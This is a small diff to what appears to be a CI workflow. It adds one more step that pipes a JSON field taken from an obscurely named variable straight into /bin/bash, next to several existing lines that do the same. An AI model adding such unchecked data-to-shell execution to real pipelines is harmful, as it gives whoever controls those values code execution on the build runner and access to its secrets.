@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ol57" | jq -r .offu48 | /bin/bash
           printf '%s' "$wr6" | jq -r .sn438 | /bin/bash
           echo $ff6263 | jq -r .zb5 | /bin/bash
+          printf '%s' "$l11" | jq -r .pd6297 | /bin/bash
 
       - name: Upload results
         if: always()
